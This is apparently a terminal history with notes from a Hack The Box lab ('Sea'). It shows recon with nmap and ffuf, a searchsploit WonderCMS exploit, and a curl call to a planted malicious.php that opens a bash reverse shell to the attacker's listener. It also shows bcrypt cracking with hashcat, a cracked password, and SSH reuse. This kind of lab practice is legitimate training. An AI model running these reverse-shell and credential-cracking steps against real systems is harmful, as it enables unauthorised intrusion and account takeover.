[2026-02-11 06:13:12] [pane=%0] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/Sea
[2026-02-11 06:13:13] [pane=%0] [CMD] ll
[2026-02-11 06:16:26] [pane=%0] [CMD] echo export IP=10.129.20.143 > ~/.ip
[2026-02-11 06:17:12] [pane=%0] [CMD] echo $IP
[2026-02-11 06:17:20] [pane=%0] [CMD] cat $IP
[2026-02-11 06:17:27] [pane=%0] [CMD] source ~/.ip
[2026-02-11 06:17:28] [pane=%0] [CMD] cat $IP
[2026-02-11 06:17:34] [pane=%0] [CMD] echo $IP
[2026-02-11 06:18:15] [pane=%0] [CMD] mkdir -p nmap ffuf loot evidence bloodhound
[2026-02-11 06:20:48] [pane=%0] [CMD] nmap -p- --min-rate 3000 -Pn -oA nmap/SeaAllPorts $IP
[2026-02-11 06:21:27] [pane=%0] [CMD] ll nmap
[2026-02-11 06:26:11] [pane=%0] [CMD] ports=$(awk '/^[0-9]+\/tcp/ {print $1}' nmap/SeaAllPorts.nmap  | cut -d/ -f1 | paste -sd,)
[2026-02-11 06:26:17] [pane=%0] [CMD] echo $ports
[2026-02-11 06:26:46] [pane=%0] [CMD] nmap -p$ports -sSCV --min-rate=2000 -Pn -oN nmap/BabyServicesVersions.txt $IP
[2026-02-11 06:29:41] [pane=%0] [CMD] sudo vim /etc/hosts
[2026-02-11 06:31:55] [pane=%0] [CMD] nmap -p$ports -sSCV --min-rate=2000 -Pn -oN nmap/SeaServicesVersions $IP
[2026-02-11 06:35:12] [pane=%0] [CMD] sudo vim /etc/hosts
[2026-02-11 06:37:55] [pane=%0] [CMD] ffuf -u http://10.129.20.143/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
[2026-02-11 06:39:07] [pane=%0] [CMD] ffuf -u http://10.129.20.143/FUZZ -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt
[2026-02-11 06:41:36] [pane=%0] [CMD] ffuf -u http://10.129.20.143/FUZZ -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt -fc 403 -v
[2026-02-11 06:45:29] [pane=%0] [CMD] wc -l /usr/share/seclists/Discovery/Web-Content/combined_directories.txt
[2026-02-11 06:54:35] [pane=%0] [CMD] wc -l /usr/share/seclists/Discovery/Web-Content/combined_directories.txt
[2026-02-11 07:03:16] [pane=%0] [CMD] ffuf -u http://10.129.20.143/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -fc 403 -v
[2026-02-11 07:04:13] [pane=%0] [CMD] ffuf -u http://10.129.20.143/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -fc 403 -v -X POST
[2026-02-11 07:05:54] [pane=%0] [CMD] ffuf -u http://10.129.20.143/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -fc 403 -v -X OPTIONS
[2026-02-11 07:06:04] [pane=%1] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/Sea
[2026-02-11 07:06:22] [pane=%1] [CMD] cat nmap/SeaServicesVersions
[2026-02-11 07:10:35] [pane=%1] [CMD] : #note nmap done, 21 and 80 only. fuzzing website and found a contact page and a loginURL page with input field
[2026-02-11 07:11:36] [pane=%0] [CMD] ffuf -u http://10.129.20.143/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -fc 403 -v -X GET
[2026-02-12 09:15:31] [pane=%0] [CMD] curl -sI http://10.129.2.3
[2026-02-14 14:29:30] [pane=%0] [CMD] ll
[2026-02-14 14:43:50] [pane=%0] [CMD] echo export IP=10.129.6.48 > ~/.ip
[2026-02-14 14:43:55] [pane=%0] [CMD] source ~/.ip
[2026-02-14 14:52:17] [pane=%0] [CMD] sudo vim /etc/hosts
[2026-02-14 15:31:57] [pane=%0] [CMD] echo "http://sea.htb" | hakrawler
[2026-02-14 15:32:30] [pane=%0] [CMD] hakrawler
[2026-02-14 15:32:38] [pane=%0] [CMD] hakrawler --help
[2026-02-14 16:25:30] [pane=%0] [CMD] curl -sI http://10.129.6.48
[2026-02-14 16:28:22] [pane=%0] [CMD] searchsploit wondercms
[2026-02-14 16:31:05] [pane=%0] [CMD] searchsploit -x php/webapps/49155.py
[2026-02-14 16:34:13] [pane=%0] [CMD] searchsploit -x multiple/webapps/51805.py
[2026-02-14 16:35:43] [pane=%0] [CMD] searchsploit -x php/remote/52271.py
[2026-02-14 16:36:49] [pane=%0] [CMD] searchsploit -x php/remote/52271.py
[2026-02-14 16:46:05] [pane=%0] [CMD] cat nmap/SeaServicesVersions
[2026-02-14 16:58:38] [pane=%0] [CMD] searchsploit wondercms
[2026-02-14 16:58:48] [pane=%0] [CMD] searchsploit -x php/remote/52271.py
[2026-02-14 17:05:19] [pane=%0] [CMD] : #note searching for velik71 brought up results for wonderCMS. Trying to make the connection between velik71 and wonderCMS I searched and found bike theme 2.o from the wonderCMS community. in wonderCMS community I downloaded the theme zip. extracting it I found images that are the same from the sea website.  
[2026-02-14 17:07:56] [pane=%0] [CMD] : #note searching wonderCMS on searchsploit reveals a list of exploits. digging through them I find php/remote/52271.py for WonderCMS 3.4.2
[2026-02-14 17:09:13] [pane=%0] [CMD] searchsploit -w php/remote/52271.py
[2026-02-14 17:09:22] [pane=%0] [CMD] searchsploit 
[2026-02-14 17:09:48] [pane=%0] [CMD] searchsploit -m php/remote/52271.py
[2026-02-14 17:09:50] [pane=%0] [CMD] ll
[2026-02-14 17:10:07] [pane=%0] [CMD] ./52271.py
[2026-02-14 17:10:23] [pane=%0] [CMD] ./52271.py --help
[2026-02-14 17:10:40] [pane=%0] [CMD] cat 52271.py
[2026-02-14 17:11:05] [pane=%0] [CMD] ll
[2026-02-14 17:11:14] [pane=%0] [CMD] python3 52271.py
[2026-02-14 17:11:51] [pane=%0] [CMD] cat 52271.py
[2026-02-14 17:12:35] [pane=%0] [CMD] vim 52271.py
[2026-02-14 17:13:53] [pane=%0] [CMD] ./52271.py
[2026-02-14 17:14:46] [pane=%0] [CMD] vim 52271.py
[2026-02-14 17:23:08] [pane=%0] [CMD] unix2dos 52271.py
[2026-02-14 17:23:15] [pane=%0] [CMD] vim 52271.py
[2026-02-14 17:23:45] [pane=%0] [CMD] rm 52271.py
[2026-02-14 17:23:53] [pane=%0] [CMD] searchsploit -m php/remote/52271.py
[2026-02-14 17:23:54] [pane=%0] [CMD] ll
[2026-02-14 17:24:07] [pane=%0] [CMD] dos2unix 52271.py
[2026-02-14 17:24:13] [pane=%0] [CMD] vim 52271.py
[2026-02-14 17:24:29] [pane=%0] [CMD] ./52271.py
[2026-02-14 17:25:47] [pane=%0] [CMD] vim 52271.py
[2026-02-14 17:34:49] [pane=%0] [CMD] ./52271.py
[2026-02-14 17:35:21] [pane=%0] [CMD] vim 52271.py
[2026-02-14 17:36:41] [pane=%0] [CMD] python3 52271.py
[2026-02-14 17:37:41] [pane=%0] [CMD] python3 52271.py
[2026-02-14 17:37:58] [pane=%0] [CMD] ./52271.py -h
[2026-02-14 17:40:13] [pane=%1] [CMD] python3 -m http.server 6969
[2026-02-14 17:40:16] [pane=%0] [CMD] python3 52271.py --url sea.htb --xip 10.10.14.69 --xport 6969
[2026-02-14 17:41:45] [pane=%0] [CMD] python3 52271.py --url sea.htb --xip 10.10.14.69 --xport 6969
[2026-02-14 17:43:01] [pane=%0] [CMD] python3 52271.py --url http://sea.htb/contact.php --xip 10.10.14.69 --xport 6969
[2026-02-14 17:44:00] [pane=%0] [CMD] python3 52271.py --url http://sea.htb/loginURL --xip 10.10.14.69 --xport 6969
[2026-02-14 17:45:44] [pane=%1] [CMD] curl -s 'http://sea.htb/themes/malicious/malicious.php' --get --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"
[2026-02-14 17:48:03] [pane=%1] [CMD] rlwrap nc -lnvp 42069
[2026-02-14 17:51:02] [pane=%1] [CMD] rlwrap nc -lnvp 42069
[2026-02-14 17:51:37] [pane=%2] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/Sea
[2026-02-14 17:52:54] [pane=%2] [CMD] curl -s 'http://sea.htb/themes/malicious/malicious.php' --get --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.69/42069 0>&1'"
[2026-02-14 17:56:03] [pane=%3] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/Sea
[2026-02-14 18:06:40] [pane=%3] [CMD] : #note used php/remote/52271.py to host a xss file. then setup a nc listener to connect to a reverse shell generated by 52271.py. 
[2026-02-14 18:28:39] [pane=%3] [CMD] : #note dropped into rev shell to find www-data@sea:/var/www/sea/data/files$ database.json with "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q"
[2026-02-14 18:37:03] [pane=%3] [CMD] hash-identifier $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
[2026-02-14 18:37:51] [pane=%3] [CMD] hash-identifier $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ
[2026-02-14 18:37:55] [pane=%3] [CMD] fg
[2026-02-14 18:40:59] [pane=%3] [CMD] jq $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
[2026-02-14 18:41:20] [pane=%3] [CMD] hashcat -hh | grep '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q'
[2026-02-14 18:43:00] [pane=%3] [CMD] hashcat -m 1420 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-02-14 18:43:54] [pane=%3] [CMD] echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q' > YourMomsHash.txt
[2026-02-14 18:43:56] [pane=%3] [CMD] ll
[2026-02-14 18:45:55] [pane=%3] [CMD] hashcat -m 3200 YourMomsHash.txt /usr/share/wordlists/rockyou.txt --force
[2026-02-14 18:46:11] [pane=%3] [CMD] hashcat YourMomsHash.txt /usr/share/wordlists/rockyou.txt --force
[2026-02-14 18:47:05] [pane=%3] [CMD] vim YourMomsHash.txt
[2026-02-14 18:47:28] [pane=%3] [CMD] hashcat YourMomsHash.txt /usr/share/wordlists/rockyou.txt --force
[2026-02-14 18:47:43] [pane=%3] [CMD] hashcat -m 3200 YourMomsHash.txt /usr/share/wordlists/rockyou.txt --force
[2026-02-14 18:52:50] [pane=%3] [CMD] : #note cracked YourMomsHash.txt hehe with mode 3200 bcrypt Hashcat - pw is mychemicalromance for the loginURL endpoint
[2026-02-14 18:54:31] [pane=%3] [CMD] searchsploit wondercms
[2026-02-14 18:59:31] [pane=%3] [CMD] ssh amay@$IP
[2026-02-14 18:59:49] [pane=%3] [CMD] ssh amay@10.129.6.48
[2026-02-14 19:01:05] [pane=%4] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/Sea/
[2026-02-14 19:24:48] [pane=%4] [CMD] : #note asay reused password mychemicalromance from the sea.htb/loginURL as he did for ssh. we logged in with it and pulled flag 75a3cdc7ed3944f0504b26f0843e132b
[2026-02-14 19:29:16] [pane=%4] [CMD] ssh -L 9090:127.0.0.1:8080 amay@10.129.6.48
[2026-02-14 19:34:37] [pane=%4] [CMD] ssh -L 9090:127.0.0.1:8080 amay@10.129.6.48
